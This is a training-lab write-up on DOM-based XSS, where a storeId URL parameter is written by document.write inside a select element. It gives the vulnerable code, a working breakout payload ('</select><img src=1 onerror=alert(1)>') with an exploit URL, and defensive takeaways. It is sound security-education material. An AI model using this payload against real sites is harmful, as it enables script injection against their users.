# Lab 10: DOM XSS in document.write sink using source location.search inside a select element

**Difficulty:** Apprentice
**Type:** DOM-based

## Goal

Trigger `alert` through DOM XSS. The product page's "Check stock" feature `document.write`s the `storeId` URL parameter inside a `<select>` dropdown.

## The key insight

```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
document.write('<option selected>' + store + '</option>');   // input here
...
document.write('</select>');
```

- **Source:** location.search (`storeId`)
- **Sink:** `document.write`
- **Context:** inside a `<select>`/`<option>` element

`<`/`>` are **not** encoded here, so tag injection is available. The obstacle is the `<select>` element: content inside a `<select>` is a parsing dead zone - an `<img>`/`<svg>` injected *inside* it won't render or execute. You must break out of the `<select>` first.

## Exploit

```html
</select><img src=1 onerror=alert(1)>
```

URL:

```
https://LAB-ID.web-security-academy.net/product?productId=1&storeId=</select><img src=1 onerror=alert(1)>
```

- `</select>` closes the dropdown, escaping the dead zone
- `<img src=1 onerror=alert(1)>` is now in normal HTML context -> onerror fires

No quote-breakout needed - the input is in the element content of `<option>`, not inside an attribute.

## How I solved it

Opened DOM Invader, which flagged the `location.search` -> `document.write` sink and generated the exploit (the `</select>` breakout + img payload). Loaded the stock-checker URL with the payload in `storeId` and the alert fired, solving the lab.

## The concept to lock in

Context isn't just HTML vs attribute vs JS - some elements have their own sub-parsing rules. `<select>`, `<textarea>`, `<title>`, `<style>` are "dead zones" where normal tags don't execute. The move: **close/break out of the special element first**, then inject in normal context.

## Takeaway

Keep untrusted data out of `document.write`, and remember element-specific parsing: escaping/encoding has to account for the special context (`<select>` here). Prefer safe DOM construction over string-built HTML.
